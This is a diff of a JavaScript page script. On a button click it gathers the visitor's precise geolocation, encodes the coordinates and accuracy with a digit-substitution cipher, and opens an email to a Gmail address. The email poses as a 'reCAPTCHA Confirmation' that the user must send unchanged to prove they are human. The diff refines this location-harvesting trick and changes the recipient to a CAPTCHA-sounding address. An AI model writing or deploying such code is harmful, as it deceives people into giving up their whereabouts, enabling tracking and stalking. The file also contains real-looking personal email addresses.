@@ -1,90 +1,48 @@
 var form = document.getElementById('btn');
 var x = document.getElementById('title');
 
-function encrypt(coords) {
-    var coordsArray = coords.split(', ');
-    for (let i = 0; i < coordsArray[0].length; i++) {
-        switch (coordsArray[0].split('')[i]) {
-            case '0':
-                coordsArray[0].split('')[i] = 'u';
-                break;
-            case '1':
-                coordsArray[0].split('')[i] = 'y';
-                break;
-            case '2':
-                coordsArray[0].split('')[i] = 'A';
-                break;
-            case '3':
-                coordsArray[0].split('')[i] = 'x';
-                break;
-            case '4':
-                coordsArray[0].split('')[i] = 'O';
-                break;
-            case '5':
-                coordsArray[0].split('')[i] = 'B';
-                break;
-            case '6':
-                coordsArray[0].split('')[i] = 'v';
-                break;
-            case '7':
-                coordsArray[0].split('')[i] = 'F';
-                break;
-            case '8':
-                coordsArray[0].split('')[i] = 'c';
-                break;
-            case '9':
-                coordsArray[0].split('')[i] = 'a';
-                break;
-            default:
-                coordsArray[0].split('')[i] = '.';
-        }
+function encrypt(coords, accuracy) {
+    var key = {
+        '0': 'A',
+        '1': 'b',
+        '2': 'C',
+        '3': 'd',
+        '4': 'E',
+        '5': 'f',
+        '6': 'W',
+        '7': 'x',
+        '8': 'Y',
+        '9': 'z',
+        '.': '.'
+    };
+    coords = coords.split(', ');
+    accuracy = accuracy.split('')
+    var lat = coords[0].split('');
+    var lon = coords[1].split('');
+
+    for (let i = 0; i < lat.length; i++) {
+        lat[i] = key[lat[i]];
     }
 
-    for (let i = 0; i < coordsArray[1].length; i++) {
-        switch (coordsArray[1].split('')[i]) {
-            case '0':
-                coordsArray[1].split('')[i] = 'u';
-                break;
-            case '1':
-                coordsArray[1].split('')[i] = 'y';
-                break;
-            case '2':
-                coordsArray[1].split('')[i] = 'A';
-                break;
-            case '3':
-                coordsArray[1].split('')[i] = 'x';
-                break;
-            case '4':
-                coordsArray[1].split('')[i] = 'O';
-                break;
-            case '5':
-                coordsArray[1].split('')[i] = 'B';
-                break;
-            case '6':
-                coordsArray[1].split('')[i] = 'v';
-                break;
-            case '7':
-                coordsArray[1].split('')[i] = 'F';
-                break;
-            case '8':
-                coordsArray[1].split('')[i] = 'c';
-                break;
-            case '9':
-                coordsArray[1].split('')[i] = 'a';
-                break;
-            default:
-                coordsArray[1].split('')[i] = '.';
-        }
+    for (let i = 0; i < lon.length; i++) {
+        lon[i] = key[lon[i]];
     }
 
-    return coordsArray.join(' ')
+    for (let i = 0; i < accuracy.length; i++) {
+        accuracy[i] = key[accuracy[i]];
+    }
+
+    lat = lat.join('');
+    lon = lon.join('');
+    accuracy = accuracy.join('');
+    return `${lat} ${lon} ${accuracy}`
 }
 
 form.addEventListener('click', function(e) {
     var options = {
         enableHighAccuracy: true,
         timeout: 5000,
-        maximumAge: 0
+        maximumAge: 6000
     };
     
     function success(pos) {
@@ -94,7 +52,7 @@ form.addEventListener('click', function(e) {
         console.log(`Latitude : ${crd.latitude}`);
         console.log(`Longitude: ${crd.longitude}`);
         console.log(`More or less ${crd.accuracy} meters.`);
-        window.open(`mailto:yimeryuz@gmail.com?subject=reCAPTCHA Confirmation: Confirm that you are human by sending this. WARNING: Do not change the body.&body=${encrypt(`${crd.latitude}, ${crd.longitude}`)}`)
+        window.open(`mailto:recaptchabotdetector@gmail.com?subject=reCAPTCHA Confirmation: Confirm that you are human by sending this. WARNING: Do not change the body.&body=${encrypt(`${crd.latitude}, ${crd.longitude}`, `${crd.accuracy}`)}`)
     }
     
     function error(err) {
